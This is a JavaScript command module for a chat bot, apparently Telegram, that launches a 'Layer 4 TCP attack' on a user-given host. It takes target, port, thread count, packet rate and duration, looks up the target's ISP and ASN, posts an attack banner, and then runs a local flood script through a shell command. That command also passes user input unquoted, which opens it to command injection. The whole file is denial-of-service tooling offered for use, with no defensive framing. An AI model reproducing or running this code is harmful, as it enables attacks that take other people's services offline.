const axios = require("axios");
const url = require("url");
const path = require("path");
const { exec } = require("child_process");

const allowedId = 7330654183;

module.exports = {
  command: ["l4tcp", ".tcp", "l4"],
  run: async ({ client, message }) => {
    const senderId = parseInt(message.sender?.userId || message.senderId?.userId || message.senderId);
    if (senderId !== allowedId) return;

    const rawText = message.message?.trim();
    const args = rawText.split(/\s+/);
    args.shift(); // hapus command

    if (args.length < 5) {
      return client.sendMessage(message.chatId, {
        message: "❌ Format: .tcp <target> <port> <threads> <pps> <duration>\n\nContoh:\n.tcp https://example.com 443 1000 10000 60\n.l4tcp 192.168.1.1 80 500 5000 120",
        replyTo: message.id,
      });
    }

    const [target, port, threads, pps, duration] = args;
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;

    const { data } = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    const info = data;

    const caption = `<blockquote>
╭━✧「 <b>L4 TCP ATTACK</b> ✅ 」
┃🎯 <b>Host:</b> ${hostname}
┃📍 <b>Port:</b> ${port}
┃🧵 <b>Threads:</b> ${threads}
┃📈 <b>PPS:</b> ${pps}/sec
┃⏱️ <b>Duration:</b> ${duration}s
┃━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
┃⚡ <b>Method:</b> LAYER4 TCP 
┃🏢 <b>ISP:</b> ${info.isp}
┃🏷️ <b>ASN:</b> ${info.as}
┃🌍 <b>IP:</b> ${info.query}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━═0
</blockquote>`;

    await client.sendMessage(message.chatId, {
      file: "https://files.catbox.moe/uvz9xe.mp4",
      message: caption,
      parseMode: "html",
      replyTo: message.id,
    });

    const L4TCP = path.join(__dirname, `../lib/cache/tcp.js`);
    exec(`${L4TCP} ${hostname} ${port} ${threads} ${pps} ${duration}`);
  },
};